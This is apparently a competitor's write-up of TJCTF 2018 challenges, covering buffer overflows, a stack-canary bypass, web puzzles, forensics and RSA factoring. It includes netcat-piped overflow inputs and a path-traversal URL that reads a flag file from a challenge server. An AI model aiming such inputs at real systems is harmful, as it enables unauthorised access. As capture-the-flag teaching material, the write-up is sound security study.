# TJCTF_2018

Writeups for tjctf 2018

## Binary Exploitation

### Math Whiz

*The neighborhood math whiz won't stop bragging about the [registration form](The neighborhood math whiz won't stop bragging about the registration form (source) he coded. Show him who's boss!) [(source)](https://static.tjctf.org/b205be62e0ea85709eae9e6b43a2041383a6bcde3ab6e956b3077d68ef04b8aa_register.c) he coded. Show him who's boss!*

`nc problem1.tjctf.org 8001`

There's a pretty blatent buffer overflow vulnerability that exists because the fgets command is being passed the wrong parameter. Just injecting enough lines of A's via python gets the job done.

```
python -c "print ('A'*100+'\n')*10" | nc problem1.tjctf.org 8001
******************** Please Register Below ********************
Full Name: Username: Password: Recovery Pin: Email: Address: Biography: Successfully registered 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' as an administrator account!
Here is your flag: tjctf{d4n63r0u5_buff3r_0v3rfl0w5}
timeout: the monitored command dumped core
```

### Tilted Troop

*Can you help us defeat the monster? [binary](https://static.tjctf.org/ec2a70a6fb4adde9dd9bc19319524cceffc821486345e4cfc670cd21f80193ed_strover) [(source)](https://static.tjctf.org/48bd93cb48aab01658f26ef62da5507446f45445aaa83c902bfd9023c803be00_strover.c)*

`nc problem1.tjctf.org 8002`

This is another buffer overflow problem. Indexed incorrectly you can input 9 characters. The ascii values of the last character's name sum together to make up the strength of all the characters because of this. Just inject an ascii string with the proper sum for the 9th character.

```
root@DESKTOP-C400:/mnt/c/Program Files/VCG/MeshLab# (python -c "print 'A\n'*8+'A aaam\n'+'F\n'"; cat) | nc problem1.tjctf.org 8002
Commands:
 A <name> - Add a team member
 F - Fight the monster
 Q - Quit
Wow! Your team is strong! Here, take this flag:
tjctf{0oPs_CoMP4Ri5ONs_r_h4rD}
Try again
^C
root@DESKTOP-C400:/mnt/c/Program Files/VCG/MeshLab#
```

### Future Canary Lab
*The world renowned Future Canary Lab is looking for a new lab member. Good luck with your [interview](https://static.tjctf.org/c962e5ec36fc4161a93c042e1837cf0fe0a35a92469f37181f827d9ee8a54cca_interview) [(source)](https://static.tjctf.org/2e1b38dc00bfb021e2deb45219f4c44b371dc1ae98b0fb2ee2d9905032e310a3_interview.c!)*

`nc problem1.tjctf.org 8000`

This one is a stack exploit via buffer overflow that requires leaving a stack canary intact. They use C's default random library with a seed of the time in seconds. Just write a C script to generate the values locally and then inject the overflow, canary, and payload to get the calculation to evaluate to 0xdeadbeef in the code via a simple python script using os.popen and pwntools' socks client.

### Secure Secrets

*I am responsible for architecting the most recent paradigm in our modern technological revolution: Secure Secrets. Why don't you [try](https://static.tjctf.org/521f71839cd9dfb7cc608497cef567f4942b849a017e28bb2e069fecfbab17fc_secure) it out?*

`nc problem1.tjctf.org 8008`

[Video Writeup](https://youtu.be/NbDZW0HQmf4)

## Web

### Blank
*Someone told me there was a flag on this [site](https://blank.tjctf.org/), so why is it that I can only see blank?*

The flag is a comment in the webpage source html code. Ctrl-U in firefox.

### Cookie Monster
*The [Cookie Monster](https://cookie_monster.tjctf.org/) is not a fan of horses*

The flag is a webpage cookie. Just go into the debug console (F-12) and find it there with the rest of the webpage cookies.

### Central Savings Account
*I seem to have forgotten the password for my savings account. What am I gonna do?*

The flag's md5 has is stored client side in the webpage js. Just throw it into hashkiller. The flag is "avalon".

### Moar Horses
*The [Horse](https://moar_horse.tjctf.org/) is back!*

This problem must seriously have been a joke. Just keep scrolling via javascript. Eventually you'll find a response containing the flag in the console.

```javascript
$(window).scroll(function () { console.log( $('.jscroll-next-parent').html() ); })
```

```
<a href="/legs">Oops, you couldn't get the flag</a> debugger eval code:1:32
<a href="/legs">Oops, you couldn't get the flag</a> debugger eval code:1:32
<a href="/legs">tjctf{h0rs3s_h4v3_lonG_l3gS}</a> debugger eval code:1:32
<a href="/legs">tjctf{h0rs3s_h4v3_lonG_l3gS}</a> debugger eval code:1:32
<a href="/legs">Oops, you couldn't get the flag</a> debugger eval code:1:32
<a href="/legs">Oops, you couldn't get the flag</a>
```

### Programmable Hyperlinked Pasta

*Check out my new site! PHP is so cool!*

[programmable_hyperlinked_pasta.tjctf.org](programmable_hyperlinked_pasta.tjctf.org)

`view-source:https://programmable_hyperlinked_pasta.tjctf.org/?lang=../flag.txt`

## Misc.

### Trippy
*[trippy](https://static.tjctf.org/be37fef78cfd6c7deda71154f567e6d0cfefbda1f80698c064bab469d3a54c58_trippy.gif)*

Run strings on the file and grep for "tjctf"

```
root@DESKTOP-C400:/mnt/d/Google Drive/Documents/ctf/TJCTF_2018/trippy# strings trippy.gif | grep tjctf
tjctf{w0w}
root@DESKTOP-C400:/mnt/d/Google Drive/Documents/ctf/TJCTF_2018/trippy#
```

### Mirror Mirror

*If you look closely, you can see a reflection.*

`nc problem1.tjctf.org 8004`

The problem leaves us with a restricted python terminal and a hint regarding reflection, a way to get possible attributes of object and/or functions at runtime in many languages.

[Video Writeup](todo)

## Forensics

### Weird Logo

*This company's logo stands in contrast of those of other leading edge tech companies with its poor design*

![Source](https://static.tjctf.org/c9a03d15f235087145579bd06f3f736a5546539254fbde100b8bf4d990bb8d8f_logo.png)

Solution: There are 2 colors of blue used in the image that are very close to one another. Use a bucket tool in paint with 100% selectivity to get the flag.

!(https://github.com/MeadeRobert/TJCTF_2018/blob/master/weird_logo/weird_logo_edited.png)

### Weird Audio Circuit

*In my electronics class, we made this cool circuit for encoding audio. Check it out!*

[Audio](https://static.tjctf.org/c34e48ab19254a7fe95fff369d8dca5272f2a46f92e6c4ffef50d9b4de5e9cbc_problem.wav)

[Videoo Writeup](https://youtu.be/ZLO1LipkSFc)

The file contains an AM modulated audio signal with a carrier at 10Khz. Demodulate with the following nyquist script in audacity, and transcribe the flag starting at ~36 seconds in.

[https://forum.audacityteam.org/viewtopic.php?t=95331](https://forum.audacityteam.org/viewtopic.php?t=95331)
`(lowpass8 (mult *track* (hzosc 10000)) 10000)`

### Ssleepy

*I found this super suspicious [transmission](https://static.tjctf.org/99870da89e552d13905dbff3fe0543ca336c4c425cb723e3f4b6c0e91a6e23e7_ssleepy.pcapng) lying around on the floor. What could be in it?*

Extract .7z file containing .pem file for RSA private key (for SSL traffic decryption) from FTP traffic in wireshark. Then, extract the flag.jpg file from the SSL traffic responding to the GET request for the flag image.

[Video Writeup](https://youtu.be/1uiYoRnXt0M)

## Cryptography

### Classic

*My primes might be close in size but they're big enough that it shouldn't matter right? [rsa.txt](https://static.tjctf.org/6bd24f59c2861c8f62358d17d677812bc079876f6951c22d13f396bbf1059cca_rsa.txt)*

The modulus is easily factored by [Fermat's Algorithm](https://en.wikipedia.org/wiki/Fermat%27s_factorization_method). Use the factorization to generate the private key and decrypt the ciphertext.

### Affine

Didn't solve this one during the competition, but I'm still pretty convinced its a linearly padded hastad broadcast attack where the padding is the sha1 hash of the modulus as a string.




